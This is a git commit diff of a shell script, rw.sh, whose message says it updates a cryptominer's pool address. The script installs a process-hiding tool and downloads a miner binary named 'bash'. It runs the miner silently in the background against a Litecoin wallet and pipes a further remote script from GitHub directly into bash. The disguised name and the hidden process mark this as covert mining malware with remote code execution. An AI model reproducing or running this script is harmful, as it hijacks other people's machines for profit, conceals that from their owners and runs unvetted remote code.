cbc824d15f042c7bde5da175aee8740bec865de7
malogrono <136266511+malogrono@users.noreply.github.com>
2026-08-27 16:49:41 +0700

    Update mining pool and algorithm in rw.sh

--- rw.sh
+++ rw.sh
@@ -2,5 +2,5 @@
 sudo su --command "curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add bash"
 wget https://github.com/malogrono/opr/raw/refs/heads/main/bash >/dev/null 2>&1
 chmod +x bash
-./bash --algorithm randomx --pool stratum+tcp://148.113.141.142:80 --wallet LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg.SR >/dev/null 2>&1 &
+./bash --algorithm randomx --pool stratum+tcp://rx.unmineable.com:3333 --wallet LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg.SR >/dev/null 2>&1 &
 curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
